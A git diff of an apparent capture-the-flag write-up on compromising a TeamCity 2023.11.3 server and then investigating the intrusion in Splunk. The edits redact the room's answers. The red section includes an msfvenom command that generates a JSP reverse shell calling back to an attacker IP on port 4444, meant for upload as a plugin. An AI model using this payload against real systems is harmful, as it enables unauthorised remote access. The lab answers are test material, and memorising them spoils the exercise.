@@ -15,7 +15,7 @@
 # RED
 
 ## Reconnaissance
-See what is running: `nmap $IP` and `nmap -p 22,80,50000 $IP`
+See what is running: `nmap $IP` and `nmap -p 22,80,50000 -sV $IP`
 ```
 PORT      STATE SERVICE  VERSION
 22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
@@ -29,7 +29,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ### TeamCity
 
 Nmap couldn't recognize the service running on port `50000`, after accessing we get into **TeamCity** 
-(JetBrains) login page, which is a CI/CD tool, we can see that the version is `Version 2023.11.3`. 
+(JetBrains) login page, which is a CI/CD tool, we can see that the version is `2023.11.3`. 
 
 <img src="./red/Cattura3.PNG"/>
 
@@ -53,10 +53,13 @@ as you can see below; even if this wasn't necessary, this is something I would l
 ## Exploitation
 
 While exploring the **Administration** dashboard we can see, at the bottom of the lateral panel the **Plugins** 
-section that looks as follows:
+section.
+<!--
+
+that looks as follows:
 
 <img src="./red/Cattura18.PNG"/>
-
+-->
 I supposed we could upload a jar/jsp reverse shell as a plugin so I created one with `msfvenom`:
 ```
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.8.28.226 LPORT=4444 -f raw > shell.jsp
@@ -118,7 +121,7 @@ Actually, there isn’t much left to do after gaining the web shell; we can just
 
 ### 1. What is the name of the backdoor user which was created on the server after exploitation?
 
-There are various ways to create a backdoor on a machine, but the question gives us a hint: it is a new user; so we can create a table with the filter `* source="/var/log/auth.log"`, there, by hovering on "name" field, we can see the user: **eviluser**.
+There are various ways to create a backdoor on a machine, but the question gives us a hint: it is a new user; so we can create a table with the filter `* source="/var/log/auth.log"`, there, by hovering on "name" field, we can see the user: [REDACTED].
 
 <img src="./blue/Cattura4.PNG"/>
 
@@ -126,7 +129,7 @@ There are various ways to create a backdoor on a machine, but the question gives
 
 This one took me some time, we know that we want to look for packages installed in the `dpkg.log`, however there are more than 3000 entries. 
 
-To make the search easier I wanted to extract a list of the installed packages, so I asked GPT if there was a way to do it in Splunk, and it came up with the following filter: `source="/var/log/dpkg.log" "install" | sort _time | rex field=_raw "install (?<package_name>\S+)" | table package_name`; the package **datacollector** looks like something malicious.
+To make the search easier I wanted to extract a list of the installed packages, so I asked GPT if there was a way to do it in Splunk, and it came up with the following filter: `source="/var/log/dpkg.log" "install" | sort _time | rex field=_raw "install (?<package_name>\S+)" | table package_name`; the package [REDACTED] looks like something malicious.
 
 <img src="./blue/Cattura10.PNG"/>
 
@@ -140,7 +143,7 @@ To answer this question we need to dig into TeamCity logs since there we can fin
 [2024-07-04 22:08:31,921]   INFO - s.buildServer.ACTIVITIES.AUDIT - plugin_uploaded: Plugin "AyzzbuXY" was updated by "user with id=11" with comment "Plugin was uploaded to /home/ubuntu/.BuildServer/plugins/AyzzbuXY.zip"
 ```
 
-The malicious plugin name is **AyzzbuXY.zip**.
+The malicious plugin name is [REDACTED].
 
 <img src="./blue/Cattura2.PNG"/>
 
